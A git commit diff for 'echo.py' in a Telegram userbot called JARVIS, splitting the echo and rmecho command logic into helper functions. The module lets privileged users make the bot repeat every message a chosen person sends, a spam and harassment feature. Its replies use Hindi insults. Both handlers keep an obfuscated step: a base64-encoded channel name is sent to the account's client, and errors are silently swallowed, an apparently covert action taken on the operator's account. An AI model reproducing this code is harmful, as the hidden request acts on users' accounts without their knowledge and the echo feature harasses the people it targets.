94600aac4ec482b8e8851cd82b43b1f75577a101
RAJNISH XD <155803358+doraemon890@users.noreply.github.com>
2024-05-27 20:36:47 +0530

    Update echo.py

--- JARVIS/modules/echo.py
+++ JARVIS/modules/echo.py
@@ -9,37 +9,49 @@ from JARVIS.data import FRIDAY
 
 ECHO = []
 
+async def check_user(event, reply_msg):
+    user_id = reply_msg.sender_id
+    if user_id in FRIDAY:
+        await event.reply("BSDK...BAAP HU TERA.")
+    elif user_id == OWNER_ID:
+        await event.reply("BETA...BAAP PAR ECHO NHI KRTE...")
+    elif user_id in SUDO_USERS:
+        await event.reply("YE BHI JARVIS KA BACHA HAI ISPE ECHO MAT MARO.. !!.")
+    else:
+        return True
+    return False
+
+async def activate_echo(event, check):
+    global ECHO
+    if check in ECHO:
+        await event.reply("» ECHO ACTIVATED HAI ISS CHUTIYE PAR !!")
+    else:
+        ECHO.append(check)
+        await event.reply("» ECHO ACTIVATED HAI ISS CHUTIYE PAR ✅")
+
+async def deactivate_echo(event, check):
+    global ECHO
+    if check in ECHO:
+        ECHO.remove(check)
+        await event.reply("» ECHO STOP HO GYA ISS USER PR.. !! ☑️")
+    else:
+        await event.reply("» ECHO STOP HO GYA ISS USER PR.. !!")
 
 @X1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
 async def echo(event):
     if event.sender_id in SUDO_USERS:
         if event.reply_to_msg_id:
             reply_msg = await event.get_reply_message()
-            user_id = reply_msg.sender_id
-
-            if user_id in FRIDAY:
-                await event.reply("BSDK...BAAP HU TERA.")
-            elif user_id == OWNER_ID:
-                await event.reply("BETA...BAAP PAR ECHO NHI KRTE...")
-            elif user_id in SUDO_USERS:
-                await event.reply("YE BHI JARVIS KA BACHA HAI ISPE ECHO MAT MARO.. !!.")
-            else:
+            if await check_user(event, reply_msg):
                 try:
                     alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                     await event.client(alt)
                 except BaseException:
                     pass
-
-                global ECHO
-                check = f"{user_id}_{event.chat_id}"
-                if check in ECHO:
-                    await event.reply("» ECHO ACTIVATED HAI ISS CHUTIYE PAR !!")
-                else:
-                    ECHO.append(check)
-                    await event.reply("» ECHO ACTIVATED HAI ISS CHUTIYE PAR ✅")
+                check = f"{reply_msg.sender_id}_{event.chat_id}"
+                await activate_echo(event, check)
         else:
             await event.reply(f"𝗘𝗰𝗵𝗼:\n  » {hl}echo <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")
-
 
 @X1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
 async def rmecho(event):
@@ -50,19 +62,11 @@ async def rmecho(event):
                 await event.client(alt)
             except BaseException:
                 pass
-
-            global ECHO
             reply_msg = await event.get_reply_message()
             check = f"{reply_msg.sender_id}_{event.chat_id}"
-
-            if check in ECHO:
-                ECHO.remove(check)
-                await event.reply("» ECHO STOP HO GYA ISS USER PR.. !! ☑️")
-            else:
-                await event.reply("» ECHO STOP HO GYA ISS USER PR.. !!")
+            await deactivate_echo(event, check)
         else:
             await event.reply(f"𝗥𝗲𝗺𝗼𝘃𝗲 𝗘𝗰𝗵𝗼:\n  » {hl}rmecho <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")
-
 
 @X1.on(events.NewMessage(incoming=True))
 async def _(e):
@@ -77,4 +81,3 @@ async def _(e):
         if e.message.text or e.message.sticker:
             await e.reply(e.message)
             await asyncio.sleep(0.1)
-                                                                                                                             
